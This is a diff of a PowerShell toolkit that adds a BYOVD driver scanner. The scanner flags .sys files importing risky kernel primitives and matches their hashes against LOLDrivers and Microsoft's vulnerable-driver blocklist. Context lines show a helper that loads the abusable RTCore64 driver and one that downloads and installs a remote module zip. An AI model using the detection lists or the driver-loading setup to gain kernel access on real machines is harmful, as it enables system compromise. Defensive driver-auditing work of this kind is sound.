+        $LolNames  = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
+        $LolMetadata = @{}
+
+        if ($ValidateLolDrivers) {
+            Write-Host "[*] Fetching latest LOLDrivers database..." -ForegroundColor Cyan
+            try {
+                $RawText = Invoke-RestMethod -Uri "https://www.loldrivers.io/api/drivers.json" -ErrorAction Stop
+                
+                Add-Type -AssemblyName System.Web.Extensions
+                $Serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer
+                $Serializer.MaxJsonLength = 2147483647 
+                
+                $LolData = $Serializer.DeserializeObject($RawText)
+
+                foreach ($Driver in $LolData) {
+                    if ($Driver.ContainsKey("Tags") -and $Driver["Tags"] -is [System.Collections.IEnumerable]) {
+                        foreach ($Tag in $Driver["Tags"]) {
+                            if ($Tag -like "*.sys") { [void]$LolNames.Add($Tag) }
+                        }
+                    }
+                    
+                    if ($Driver.ContainsKey("KnownVulnerableSamples") -and $Driver["KnownVulnerableSamples"] -is [System.Collections.IEnumerable]) {
+                        $CategoryStr = if ($Driver.ContainsKey("Category")) { $Driver["Category"] } else { "Unknown" }
+                        $DescStr = "N/A"
+                        if ($Driver.ContainsKey("Commands") -and $Driver["Commands"] -is [System.Collections.IDictionary]) {
+                            if ($Driver["Commands"].ContainsKey("Description")) { $DescStr = $Driver["Commands"]["Description"] }
+                        }
+                        $DriverId = if ($Driver.ContainsKey("Id")) { $Driver["Id"] } else { "" }
+
+                        foreach ($Sample in $Driver["KnownVulnerableSamples"]) {
+                            if ($Sample -is [System.Collections.IDictionary]) {
+                                if ($Sample.ContainsKey("Filename") -and $Sample["Filename"]) { 
+                                    [void]$LolNames.Add($Sample["Filename"]) 
+                                }
+                                
+                                @("SHA256", "SHA1", "MD5") | ForEach-Object {
+                                    if ($Sample.ContainsKey($_) -and $Sample[$_]) {
+                                        $HashStr = $Sample[$_].ToString()
+                                        [void]$LolHashes.Add($HashStr)
+                                        $LolMetadata[$HashStr.ToLower()] = @{
+                                            Category    = $CategoryStr
+                                            Description = $DescStr
+                                            Id          = $DriverId
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                Write-Host "[+] Successfully indexed $($LolHashes.Count) LOLDrivers signatures." -ForegroundColor Green
+            } catch {
+                Write-Warning "Failed to contact or parse LOLDrivers API. Error: $_"
+            }
+        }
+
+        # --- Microsoft Vulnerable Driver Blocklist Integration ---
+        $MSBlockedHashes = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
+        if ($ValidateMSBlockPolicy) {
+            Write-Host "[*] Fetching and parsing Microsoft Vulnerable Driver Blocklist..." -ForegroundColor Cyan
+            try {
+                $DestinationZip = "$env:TEMP\VulnerableDriverBlockList.zip"
+                $ExtractPath = "$env:TEMP\VulnerableDriverBlockList_Extracted"
+        
+                Invoke-WebRequest -Uri "https://aka.ms/VulnerableDriverBlockList" -OutFile $DestinationZip -ErrorAction Stop
+        
+                if (Test-Path $ExtractPath) { Remove-Item $ExtractPath -Recurse -Force }
+                Expand-Archive -Path $DestinationZip -DestinationPath $ExtractPath -Force
+        
+                $XmlFile = Get-ChildItem -Path $ExtractPath -Filter "DriverPolicy_Enforced.xml" -Recurse | Select-Object -First 1
+                if ($null -ne $XmlFile) {
+                    [xml]$MSDoc = Get-Content -Path $XmlFile.FullName -Raw
+                    foreach ($Rule in $MSDoc.SiPolicy.FileRules.Deny) {
+                        if ($Rule.Hash -and $Rule.Hash.Length -eq 64 -and $Rule.FriendlyName -match 'Hash Sha256' -and $Rule.FriendlyName -notmatch 'Page') {
+                            [void]$MSBlockedHashes.Add($Rule.Hash)
+                        }
+                    }
+                    Write-Host "[+] Successfully indexed $($MSBlockedHashes.Count) standard Microsoft SHA256 signatures." -ForegroundColor Green
+                } else {
+                    Write-Warning "DriverPolicy_Enforced.xml was not located."
+                }
+        
+                Remove-Item $DestinationZip -Force -ErrorAction SilentlyContinue
+                Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
+            } catch {
+                Write-Warning "Failed to dynamically download or unpack Microsoft block definitions. Error: $_"
+            }
+        }
+
+        # Build target paths array
+        $TargetPaths = [System.Collections.Generic.List[string]]::new()
+        if ($System32)     { $TargetPaths.Add("$env:SystemRoot\System32") }
+        if ($Drivers)      { $TargetPaths.Add("$env:SystemRoot\System32\drivers") }
+        if ($ProgramFiles) { $TargetPaths.Add($env:ProgramFiles); $TargetPaths.Add(${env:ProgramFiles(x86)}) }
+        if ($CustomPath)   { $TargetPaths.Add($CustomPath) }
+
+        if ($TargetPaths.Count -eq 0) {
+            $TargetPaths.Add("$env:SystemRoot\System32")
+            $TargetPaths.Add("$env:SystemRoot\System32\drivers")
+            $TargetPaths.Add($env:ProgramFiles)
+            $TargetPaths.Add(${env:ProgramFiles(x86)})
+        }
+    }
+
+    process {
+        $TargetPaths | Select-Object -Unique | ForEach-Object {
+            $CurrentFolder = $_
+            if (-not (Test-Path -Path $CurrentFolder)) { return }
+
+            $GCIParams = @{
+                Path        = $CurrentFolder
+                Filter      = "*.sys"
+                ErrorAction = "SilentlyContinue"
+            }
+            if (-not $NoRecurse) { $GCIParams.Recurse = $true }
+
+            Get-ChildItem @GCIParams | ForEach-Object {
+                $File = $_
+                try {
+                    $Imports = Get-DriverImports -DllName $File.FullName -ErrorAction SilentlyContinue
+                    if ($null -eq $Imports) { return }
+
+                    # Track findings and calculate high score dynamically
+                    $CalculatedScore = 1
+                    $FoundPrimitives = foreach ($Match in $Imports) {
+                        if ($BYOVDPrimitives.Contains($Match.ImportedFunction)) {
+                            # Fetch internal primitive evaluation score
+                            $MatchScore = 1
+                            if ($ScoringEngine.ContainsKey($Match.ImportedFunction)) {
+                                $MatchScore = $ScoringEngine[$Match.ImportedFunction]
+                            }
+                            if ($MatchScore -gt $CalculatedScore) { $CalculatedScore = $MatchScore }
+
+                            "[from $($Match.SourceModule)] -> $($Match.ImportedFunction) (Threat: $MatchScore)"
+                        }
+                    }
+
+                    # Calculate Hash early to check both verification paths
+                    $HashSHA256 = "UNKNOWN"
+                    $IsLolMatch = $false
+                    $IsMSMatch  = $false
+                    $LolMatchDetails = $null
+
+                    try {
+                        $HashSHA256 = (Get-FileHash -Path $File.FullName -Algorithm SHA256 -ErrorAction Stop).Hash
+                        
+                        # Validate Against LOLDrivers
+                        if ($ValidateLolDrivers -and $LolHashes.Contains($HashSHA256)) {
+                            $IsLolMatch = $true
+                            $LolMatchDetails = $LolMetadata[$HashSHA256.ToLower()]
+                        }
+
+                        # Validate Against Microsoft Blocklist
+                        if ($ValidateMSBlockPolicy -and $MSBlockedHashes.Contains($HashSHA256)) {
+                            $IsMSMatch = $true
+                        }
+                    } catch {
+                        $HashSHA256 = "LOCKED / ACCESS DENIED"
+                    }
+
+                    # Fallback lookup match by name for LOLDrivers
+                    if ($ValidateLolDrivers -and -not $IsLolMatch -and $LolNames.Contains($File.Name)) {
+                        $IsLolMatch = $true
+                    }
+
+                    # Dynamic database verification automatically overrides score to 10
+                    if ($IsLolMatch -or $IsMSMatch) { $CalculatedScore = 10 }
+
+                    # Output evaluation criteria matches
+                    if (($FoundPrimitives -or $IsLolMatch -or $IsMSMatch) -and (
+                        $CalculatedScore -ge $MinThreatLevel)) {
+
+                        $VersionInfo = [System.Diagnostics.FileVersionInfo]::GetVersionInfo($File.FullName)
+                        $CompanyName = $VersionInfo.CompanyName
+
+                        # Filtering engine configuration parameters
+                        if (-not $IncludeAll -and -not $IsLolMatch -and -not $IsMSMatch) {
+                            if ([string]::IsNullOrWhiteSpace($CompanyName) -or $CompanyName -match "Microsoft") {
+                                return
+                            }
+                        }
+
+                        Write-Host "--------------------------------------------------" -ForegroundColor Gray
+                        
+                        if ($IsLolMatch) {
+                            Write-Host "[!!!] MATCHED LOLDRIVERS DATABASE [!!!]" -ForegroundColor Magenta
+                            if ($LolMatchDetails) {
+                                Write-Host "CATEGORY:  $($LolMatchDetails.Category.ToUpper())" -ForegroundColor Green
+                                Write-Host "DETAILS:   $($LolMatchDetails.Description)" -ForegroundColor Green
+                            }
+                        }
+
+                        if ($IsMSMatch) {
+                            Write-Host "[!!!] MATCHED OFFICIAL MICROSOFT DRIVER BLOCKLIST [!!!]" -ForegroundColor Black -BackgroundColor DarkYellow
+                        }
+
+                        # Apply dynamic alert color based on severity score
+                        $UiColor = "Green"
+                        if ($CalculatedScore -ge 8) { $UiColor = "Red" }
+                        elseif ($CalculatedScore -ge 5) { $UiColor = "Yellow" }
+                        elseif ($CalculatedScore -gt 1) { $UiColor = "Cyan" }
+
+                        Write-Host "THREAT SCORE: [$CalculatedScore / 10]" -ForegroundColor $UiColor -BackgroundColor Black
+                        Write-Host "SCAN MODE:    [$ScanMode]" -ForegroundColor DarkCyan
+                        Write-Host "PATH:         $($File.FullName)" -ForegroundColor Cyan
+                        Write-Host "DRIVER:       $($File.Name)"
+                        Write-Host "COMPANY:      $      ($CompanyName)"
+                        Write-Host "INFO:         $($VersionInfo.FileDescription)"
+                        Write-Host "SHA256:       $HashSHA256" -ForegroundColor DarkGray
+                        
+                        if ($FoundPrimitives) {
+                            Write-Host "SUSPICIOUS IMPORTS:" -ForegroundColor Yellow
+                            foreach ($Primitive in $FoundPrimitives) {
+                                Write-Host "  --> $Primitive" -ForegroundColor Yellow
+                            }
+                        } else {
+                            Write-Host "IMPORTS: No target primitives matched, but found inside validation databases." -ForegroundColor Gray
+                        }
+                    }
+                } catch {
+                    return
+                }
+            }
+
+        }
+    }
+}
+# Export / import Helper
 function Export-BinaryToTaggedBase {
     param (
         [Parameter(Mandatory=$true)][string]$FilePath,
@@ -313,6 +1234,7 @@ function Import-EmbeddedBlock {
         return $false
     }
 }
+# Native module install helper
 Function Install-NativeModule {
     try {
         $repoUrl = "https://github.com/BlueOnBLack/Unmanaged.PS1.Library/archive/refs/heads/main.zip"
@@ -329,6 +1251,67 @@ Function Install-NativeModule {
     } catch {
     }
 }
+# Hex view Helper
+function Format-HexView {
+    [CmdletBinding(DefaultParameterSetName = "ByteArray")]
+    param (
+        # Parameter Set 1: Standard Byte Array Input
+        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ParameterSetName = "ByteArray")]
+        [byte[]]$Data,
+
+        # Parameter Set 2: Direct Unmanaged Pointer Input
+        [Parameter(Mandatory = $true, Position = 0, ParameterSetName = "Pointer")]
+        [IntPtr]$Address,
+
+        [Parameter(Mandatory = $true, Position = 1, ParameterSetName = "Pointer")]
+        [int]$Size,
+
+        [ValidateSet("4x", "8x", "16x")]
+        [string]$Mode = "8x"
+    )
+
+    begin {
+        $fullBuffer = [System.Collections.Generic.List[byte]]::new()
+        $Count = [int]($Mode.Replace("x", ""))
+        
+        if ($PsCmdlet.ParameterSetName -eq "Pointer") {
+            if ($Address -eq [IntPtr]::Zero -or $Size -le 0) {
+                Write-Error "Invalid memory pointer address or size requested."
+                return
+            }
+            $tempArray = [byte[]]::new($Size)
+            [System.Runtime.InteropServices.Marshal]::Copy($Address, $tempArray, 0, $Size)
+            $fullBuffer.AddRange($tempArray)
+        }
+    }
+    process {
+        # Validated: Null check keeps 0x00 bytes intact through pipeline unrolling
+        if ($PsCmdlet.ParameterSetName -eq "ByteArray" -and $null -ne $Data) {
+            $fullBuffer.AddRange($Data)
+        }
+    }
+    end {
+        if ($fullBuffer.Count -eq 0) {
+            Write-Warning "Hex view buffer is empty."
+            return
+        }
+
+        Write-Host "--- Total: $($fullBuffer.Count) bytes | Alignment: $Mode ---" -ForegroundColor Cyan
+        
+        for ($i = 0; $i -lt $fullBuffer.Count; $i += $Count) {
+            $remaining = [Math]::Min($Count, $fullBuffer.Count - $i)
+            
+            $hexElements = [string[]]::new($remaining)
+            for ($j = 0; $j -lt $remaining; $j++) {
+                $hexElements[$j] = "{0:X2}" -f $fullBuffer[$i + $j]
+            }
+            
+            $hexPart = $hexElements -join " "
+            "{0:X4} : {1}" -f $i, $hexPart
+        }
+    }
+}
+# Misc
 Function initialize-RtCore {
     $RTCore = Get-Service -Name RTCore64 -ErrorAction SilentlyContinue
     if (!$RTCore) {
@@ -431,131 +1414,6 @@ function Get-KernelCustomHash {
     }
 
     return [uint32](( -bnot $crc ) -band 0xFFFFFFFF)
-}
-function Scan-DriverPrimitive {
-    [CmdletBinding()]
-    param (
-        [Parameter(Mandatory = $false, Position = 0)]
-        [string]$Path = 'C:\Program Files'
-    )
-
-    begin {
-        # Using a HashSet provides O(1) lookups instead of sequential scanning via -contains
-        $BYOVDPrimitives = [System.Collections.Generic.HashSet[string]]::new([string[]]@(
-            # --- Virtual & Physical Memory Mapping ---
-            "MmMapIoSpace", "MmMapIoSpaceEx", "MmMapIoSpaceSecure",
-            "MmMapLockedPages", "MmMapLockedPagesSpecifyCache", "MmMapLockedPagesWithReservedMapping",
-            "ZwMapViewOfSection", "NtMapViewOfSection", "MmMapUserAddressesToPageDirectory",
-            "MmAllocateMappingAddress", "MmFreeMappingAddress",
-
-            # --- Direct Memory Copy Primitives ---
-            "MmCopyVirtualMemory", "MmCopyMemory",
-
-            # --- Physical Address Resolution, Allocation & Object Resolution ---
-            "MmGetPhysicalAddress", "MmGetVirtualForPhysical", "MmGetPhysicalMemoryRanges",
-            "MmIsAddressValid", "MmAllocatePagesForMdlEx", "ObReferenceObjectByName", "IoGetDeviceObjectPointer",
-
-            # --- Hardware Port & Register Access ---
-            "READ_PORT_UCHAR", "READ_PORT_USHORT", "READ_PORT_ULONG",
-            "WRITE_PORT_UCHAR", "WRITE_PORT_USHORT", "WRITE_PORT_ULONG",
-            "READ_PORT_BUFFER_UCHAR", "READ_PORT_BUFFER_USHORT", "READ_PORT_BUFFER_ULONG",
-            "WRITE_PORT_BUFFER_UCHAR", "WRITE_PORT_BUFFER_USHORT", "WRITE_PORT_BUFFER_ULONG",
-
-            # --- Direct CPU Register Modification ---
-            "__readmsr", "__writemsr", 
-            "__readcr0", "__writecr0",
-            "__readcr3", "__writecr3", 
-            "__readcr4", "__writecr4",
-
-            # --- Process/Thread Manipulation Primitives ---
-            "ZwTerminateProcess", "NtTerminateProcess", "ZwOpenProcess", 
-            "PsLookupProcessByProcessId", "ZwTerminateThread", "PsTerminateSystemThread"
-        ), [System.StringComparer]::OrdinalIgnoreCase)
-    }
-
-    process {
-        # Streaming via the pipeline prevents loading thousands of FileInfo objects into memory at once
-        Get-ChildItem -Path $Path -Filter "*.sys" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
-            $File = $_
-            try {
-                $Imports = Get-Imports -DllName $File.FullName -ErrorAction SilentlyContinue
-                if ($null -eq $Imports) { return } # 'return' acts as 'continue' inside ForEach-Object
-
-                foreach ($Match in $Imports) {
-                    # Fast O(1) hash set lookup
-                    if ($BYOVDPrimitives.Contains($Match.ImportedFunction)) {
-                        [PSCustomObject]@{
-                            DriverName      = $File.Name
-                            DangerousImport = $Match.ImportedFunction
-                            ImportedFrom    = $Match.SourceModule
-                            FullPath        = $File.FullName
-                        }
-                    }
-                }
-            } catch {
-                return
-            }
-        }
-    }
-}
-function Format-HexView {
-    [CmdletBinding(DefaultParameterSetName = "ByteArray")]
-    param (
-        # Parameter Set 1: Standard Byte Array Input
-        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ParameterSetName = "ByteArray")]
-        [byte[]]$Data,
-
-        # Parameter Set 2: Direct Unmanaged Pointer Input
-        [Parameter(Mandatory = $true, Position = 0, ParameterSetName = "Pointer")]
-        [IntPtr]$Address,
-
-        [Parameter(Mandatory = $true, Position = 1, ParameterSetName = "Pointer")]
-        [int]$Size,
-
-        [ValidateSet("4x", "8x", "16x")]
-        [string]$Mode = "8x"
-    )
-
-    begin {
-        $fullBuffer = [System.Collections.Generic.List[byte]]::new()
-        $Count = [int]($Mode.Replace("x", ""))
-        
-        if ($PsCmdlet.ParameterSetName -eq "Pointer") {
-            if ($Address -eq [IntPtr]::Zero -or $Size -le 0) {
-                Write-Error "Invalid memory pointer address or size requested."
-                return
-            }
-            $tempArray = [byte[]]::new($Size)
-            [System.Runtime.InteropServices.Marshal]::Copy($Address, $tempArray, 0, $Size)
-            $fullBuffer.AddRange($tempArray)
-        }
-    }
-    process {
-        # Validated: Null check keeps 0x00 bytes intact through pipeline unrolling
-        if ($PsCmdlet.ParameterSetName -eq "ByteArray" -and $null -ne $Data) {
-            $fullBuffer.AddRange($Data)
-        }
-    }
-    end {
-        if ($fullBuffer.Count -eq 0) {
-            Write-Warning "Hex view buffer is empty."
-            return
-        }
-
-        Write-Host "--- Total: $($fullBuffer.Count) bytes | Alignment: $Mode ---" -ForegroundColor Cyan
-        
-        for ($i = 0; $i -lt $fullBuffer.Count; $i += $Count) {
-            $remaining = [Math]::Min($Count, $fullBuffer.Count - $i)
-            
-            $hexElements = [string[]]::new($remaining)
-            for ($j = 0; $j -lt $remaining; $j++) {
-                $hexElements[$j] = "{0:X2}" -f $fullBuffer[$i + $j]
-            }
-            
-            $hexPart = $hexElements -join " "
-            "{0:X4} : {1}" -f $i, $hexPart
-        }
-    }
 }
 #endregion
 
@@ -4237,369 +5095,6 @@ enum CodeIntegrityOptions {
     HvciIumEnabled                  = 0x4000
     WhqlEnforcementEnabled          = 0x8000
 }
-if (!([PSTypeName]'PE').Type) {
-$code = @"
-using System;
-using System.Runtime.InteropServices;
-
-public class PE
-{
-    [Flags]
-    public enum IMAGE_DOS_SIGNATURE : ushort
-    {
-        DOS_SIGNATURE = 0x5A4D, // MZ
-        OS2_SIGNATURE = 0x454E, // NE
-        OS2_SIGNATURE_LE = 0x454C, // LE
-        VXD_SIGNATURE = 0x454C, // LE
-    }
-        
-    [Flags]
-    public enum IMAGE_NT_SIGNATURE : uint
-    {
-        VALID_PE_SIGNATURE = 0x00004550 // PE00
-    }
-        
-    [Flags]
-    public enum IMAGE_FILE_MACHINE : ushort
-    {
-        UNKNOWN = 0,
-        I386 = 0x014c, // Intel 386.
-        R3000 = 0x0162, // MIPS little-endian =0x160 big-endian
-        R4000 = 0x0166, // MIPS little-endian
-        R10000 = 0x0168, // MIPS little-endian
-        WCEMIPSV2 = 0x0169, // MIPS little-endian WCE v2
-        ALPHA = 0x0184, // Alpha_AXP
-        SH3 = 0x01a2, // SH3 little-endian
-        SH3DSP = 0x01a3,
-        SH3E = 0x01a4, // SH3E little-endian
-        SH4 = 0x01a6, // SH4 little-endian
-        SH5 = 0x01a8, // SH5
-        ARM = 0x01c0, // ARM Little-Endian
-        THUMB = 0x01c2,
-        ARMNT = 0x01c4, // ARM Thumb-2 Little-Endian
-        AM33 = 0x01d3,
-        POWERPC = 0x01F0, // IBM PowerPC Little-Endian
-        POWERPCFP = 0x01f1,
-        IA64 = 0x0200, // Intel 64
-        MIPS16 = 0x0266, // MIPS
-        ALPHA64 = 0x0284, // ALPHA64
-        MIPSFPU = 0x0366, // MIPS
-        MIPSFPU16 = 0x0466, // MIPS
-        AXP64 = ALPHA64,
-        TRICORE = 0x0520, // Infineon
-        CEF = 0x0CEF,
-        EBC = 0x0EBC, // EFI public byte Code
-        AMD64 = 0x8664, // AMD64 (K8)
-        M32R = 0x9041, // M32R little-endian
-        CEE = 0xC0EE
-    }
-        
-    [Flags]
-    public enum IMAGE_FILE_CHARACTERISTICS : ushort
-    {
-        IMAGE_RELOCS_STRIPPED = 0x0001, // Relocation info stripped from file.
-        IMAGE_EXECUTABLE_IMAGE = 0x0002, // File is executable (i.e. no unresolved external references).
-        IMAGE_LINE_NUMS_STRIPPED = 0x0004, // Line nunbers stripped from file.
-        IMAGE_LOCAL_SYMS_STRIPPED = 0x0008, // Local symbols stripped from file.
-        IMAGE_AGGRESIVE_WS_TRIM = 0x0010, // Agressively trim working set
-        IMAGE_LARGE_ADDRESS_AWARE = 0x0020, // App can handle >2gb addresses
-        IMAGE_REVERSED_LO = 0x0080, // public bytes of machine public ushort are reversed.
-        IMAGE_32BIT_MACHINE = 0x0100, // 32 bit public ushort machine.
-        IMAGE_DEBUG_STRIPPED = 0x0200, // Debugging info stripped from file in .DBG file
-        IMAGE_REMOVABLE_RUN_FROM_SWAP = 0x0400, // If Image is on removable media =copy and run from the swap file.
-        IMAGE_NET_RUN_FROM_SWAP = 0x0800, // If Image is on Net =copy and run from the swap file.
-        IMAGE_SYSTEM = 0x1000, // System File.
-        IMAGE_DLL = 0x2000, // File is a DLL.
-        IMAGE_UP_SYSTEM_ONLY = 0x4000, // File should only be run on a UP machine
-        IMAGE_REVERSED_HI = 0x8000 // public bytes of machine public ushort are reversed.
-    }
-        
-    [Flags]
-    public enum IMAGE_NT_OPTIONAL_HDR_MAGIC : ushort
-    {
-        PE32 = 0x10b,
-        PE64 = 0x20b
-    }
-        
-    [Flags]
-    public enum IMAGE_SUBSYSTEM : ushort
-    {
-        UNKNOWN = 0, // Unknown subsystem.
-        NATIVE = 1, // Image doesn't require a subsystem.
-        WINDOWS_GUI = 2, // Image runs in the Windows GUI subsystem.
-        WINDOWS_CUI = 3, // Image runs in the Windows character subsystem.
-        OS2_CUI = 5, // image runs in the OS/2 character subsystem.
-        POSIX_CUI = 7, // image runs in the Posix character subsystem.
-        NATIVE_WINDOWS = 8, // image is a native Win9x driver.
-        WINDOWS_CE_GUI = 9, // Image runs in the Windows CE subsystem.
-        EFI_APPLICATION = 10,
-        EFI_BOOT_SERVICE_DRIVER = 11,
-        EFI_RUNTIME_DRIVER = 12,
-        EFI_ROM = 13,
-        XBOX = 14,
-        WINDOWS_BOOT_APPLICATION = 16
-    }
-        
-    [Flags]
-    public enum IMAGE_DLLCHARACTERISTICS : ushort
-    {
-        DYNAMIC_BASE = 0x0040, // DLL can move.
-        FORCE_INTEGRITY = 0x0080, // Code Integrity Image
-        NX_COMPAT = 0x0100, // Image is NX compatible
-        NO_ISOLATION = 0x0200, // Image understands isolation and doesn't want it
-        NO_SEH = 0x0400, // Image does not use SEH. No SE handler may reside in this image
-        NO_BIND = 0x0800, // Do not bind this image.
-        WDM_DRIVER = 0x2000, // Driver uses WDM model
-        TERMINAL_SERVER_AWARE = 0x8000
-    }
-        
-    [Flags]
-    public enum IMAGE_SCN : uint
-    {
-        TYPE_NO_PAD = 0x00000008, // Reserved.
-        CNT_CODE = 0x00000020, // Section contains code.
-        CNT_INITIALIZED_DATA = 0x00000040, // Section contains initialized data.
-        CNT_UNINITIALIZED_DATA = 0x00000080, // Section contains uninitialized data.
-        LNK_INFO = 0x00000200, // Section contains comments or some other type of information.
-        LNK_REMOVE = 0x00000800, // Section contents will not become part of image.
-        LNK_COMDAT = 0x00001000, // Section contents comdat.
-        NO_DEFER_SPEC_EXC = 0x00004000, // Reset speculative exceptions handling bits in the TLB entries for this section.
-        GPREL = 0x00008000, // Section content can be accessed relative to GP
-        MEM_FARDATA = 0x00008000,
-        MEM_PURGEABLE = 0x00020000,
-        MEM_16BIT = 0x00020000,
-        MEM_LOCKED = 0x00040000,
-        MEM_PRELOAD = 0x00080000,
-        ALIGN_1BYTES = 0x00100000,
-        ALIGN_2BYTES = 0x00200000,
-        ALIGN_4BYTES = 0x00300000,
-        ALIGN_8BYTES = 0x00400000,
-        ALIGN_16BYTES = 0x00500000, // Default alignment if no others are specified.
-        ALIGN_32BYTES = 0x00600000,
-        ALIGN_64BYTES = 0x00700000,
-        ALIGN_128BYTES = 0x00800000,
-        ALIGN_256BYTES = 0x00900000,
-        ALIGN_512BYTES = 0x00A00000,
-        ALIGN_1024BYTES = 0x00B00000,
-        ALIGN_2048BYTES = 0x00C00000,
-        ALIGN_4096BYTES = 0x00D00000,
-        ALIGN_8192BYTES = 0x00E00000,
-        ALIGN_MASK = 0x00F00000,
-        LNK_NRELOC_OVFL = 0x01000000, // Section contains extended relocations.
-        MEM_DISCARDABLE = 0x02000000, // Section can be discarded.
-        MEM_NOT_CACHED = 0x04000000, // Section is not cachable.
-        MEM_NOT_PAGED = 0x08000000, // Section is not pageable.
-        MEM_SHARED = 0x10000000, // Section is shareable.
-        MEM_EXECUTE = 0x20000000, // Section is executable.
-        MEM_READ = 0x40000000, // Section is readable.
-        MEM_WRITE = 0x80000000 // Section is writeable.
-    }
-    
-    [StructLayout(LayoutKind.Sequential, Pack=1)]
-    public struct _IMAGE_DOS_HEADER
-    {
-        public IMAGE_DOS_SIGNATURE e_magic; // Magic number
-        public ushort e_cblp; // public bytes on last page of file
-        public ushort e_cp; // Pages in file
-        public ushort e_crlc; // Relocations
-        public ushort e_cparhdr; // Size of header in paragraphs
-        public ushort e_minalloc; // Minimum extra paragraphs needed
-        public ushort e_maxalloc; // Maximum extra paragraphs needed
-        public ushort e_ss; // Initial (relative) SS value
-        public ushort e_sp; // Initial SP value
-        public ushort e_csum; // Checksum
-        public ushort e_ip; // Initial IP value
-        public ushort e_cs; // Initial (relative) CS value
-        public ushort e_lfarlc; // File address of relocation table
-        public ushort e_ovno; // Overlay number
-        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
-        public string e_res; // This will contain 'Detours!' if patched in memory
-        public ushort e_oemid; // OEM identifier (for e_oeminfo)
-        public ushort e_oeminfo; // OEM information; e_oemid specific
-        [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst=10)] // , ArraySubType=UnmanagedType.U4
-        public ushort[] e_res2; // Reserved public ushorts
-        public int e_lfanew; // File address of new exe header
-    }
-        
-    [StructLayout(LayoutKind.Sequential, Pack=1)]
-    public struct _IMAGE_FILE_HEADER
-    {
-        public IMAGE_FILE_MACHINE Machine;
-        public ushort NumberOfSections;
-        public uint TimeDateStamp;
-        public uint PointerToSymbolTable;
-        public uint NumberOfSymbols;
-        public ushort SizeOfOptionalHeader;
-        public IMAGE_FILE_CHARACTERISTICS Characteristics;
-    }
-        
-    [StructLayout(LayoutKind.Sequential, Pack=1)]
-    public struct _IMAGE_NT_HEADERS32
-    {
-        public IMAGE_NT_SIGNATURE Signature;
-        public _IMAGE_FILE_HEADER FileHeader;
-        public _IMAGE_OPTIONAL_HEADER32 OptionalHeader;
-    }
-        
-    [StructLayout(LayoutKind.Sequential, Pack=1)]
-    public struct _IMAGE_NT_HEADERS64
-    {
-        public IMAGE_NT_SIGNATURE Signature;
-        public _IMAGE_FILE_HEADER FileHeader;
-        public _IMAGE_OPTIONAL_HEADER64 OptionalHeader;
-    }
-        
-    [StructLayout(LayoutKind.Sequential, Pack=1)]
-    public struct _IMAGE_OPTIONAL_HEADER32
-    {
-        public IMAGE_NT_OPTIONAL_HDR_MAGIC Magic;
-        public byte MajorLinkerVersion;
-        public byte MinorLinkerVersion;
-        public uint SizeOfCode;
-        public uint SizeOfInitializedData;
-        public uint SizeOfUninitializedData;
-        public uint AddressOfEntryPoint;
-        public uint BaseOfCode;
-        public uint BaseOfData;
-        public uint ImageBase;
-        public uint SectionAlignment;
-        public uint FileAlignment;
-        public ushort MajorOperatingSystemVersion;
-        public ushort MinorOperatingSystemVersion;
-        public ushort MajorImageVersion;
-        public ushort MinorImageVersion;
-        public ushort MajorSubsystemVersion;
-        public ushort MinorSubsystemVersion;
-        public uint Win32VersionValue;
-        public uint SizeOfImage;
-        public uint SizeOfHeaders;
-        public uint CheckSum;
-        public IMAGE_SUBSYSTEM Subsystem;
-        public IMAGE_DLLCHARACTERISTICS DllCharacteristics;
-        public uint SizeOfStackReserve;
-        public uint SizeOfStackCommit;
-        public uint SizeOfHeapReserve;
-        public uint SizeOfHeapCommit;
-        public uint LoaderFlags;
-        public uint NumberOfRvaAndSizes;
-        [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst=16)]
-        public _IMAGE_DATA_DIRECTORY[] DataDirectory;
-    }
-        
-    [StructLayout(LayoutKind.Sequential, Pack=1)]
-    public struct _IMAGE_OPTIONAL_HEADER64
-    {
-        public IMAGE_NT_OPTIONAL_HDR_MAGIC Magic;
-        public byte MajorLinkerVersion;
-        public byte MinorLinkerVersion;
-        public uint SizeOfCode;
-        public uint SizeOfInitializedData;
-        public uint SizeOfUninitializedData;
-        public uint AddressOfEntryPoint;
-        public uint BaseOfCode;
-        public ulong ImageBase;
-        public uint SectionAlignment;
-        public uint FileAlignment;
-        public ushort MajorOperatingSystemVersion;
-        public ushort MinorOperatingSystemVersion;
-        public ushort MajorImageVersion;
-        public ushort MinorImageVersion;
-        public ushort MajorSubsystemVersion;
-        public ushort MinorSubsystemVersion;
-        public uint Win32VersionValue;
-        public uint SizeOfImage;
-        public uint SizeOfHeaders;
-        public uint CheckSum;
-        public IMAGE_SUBSYSTEM Subsystem;
-        public IMAGE_DLLCHARACTERISTICS DllCharacteristics;
-        public ulong SizeOfStackReserve;
-        public ulong SizeOfStackCommit;
-        public ulong SizeOfHeapReserve;
-        public ulong SizeOfHeapCommit;
-        public uint LoaderFlags;
-        public uint NumberOfRvaAndSizes;
-        [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst=16)]
-        public _IMAGE_DATA_DIRECTORY[] DataDirectory;
-    }
-        
-    [StructLayout(LayoutKind.Sequential, Pack=1)]
-    public struct _IMAGE_DATA_DIRECTORY
-    {
-        public uint VirtualAddress;
-        public uint Size;
-    }
-        
-    [StructLayout(LayoutKind.Sequential, Pack=1)]
-    public struct _IMAGE_EXPORT_DIRECTORY
-    {
-        public uint Characteristics;
-        public uint TimeDateStamp;
-        public ushort MajorVersion;
-        public ushort MinorVersion;
-        public uint Name;
-        public uint Base;
-        public uint NumberOfFunctions;
-        public uint NumberOfNames;
-        public uint AddressOfFunctions; // RVA from base of image
-        public uint AddressOfNames; // RVA from base of image
-        public uint AddressOfNameOrdinals; // RVA from base of image
-    }
-       
-    [StructLayout(LayoutKind.Sequential, Pack=1)]
-    public struct _IMAGE_SECTION_HEADER
-    {
-        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
-        public string Name;
-        public uint VirtualSize;
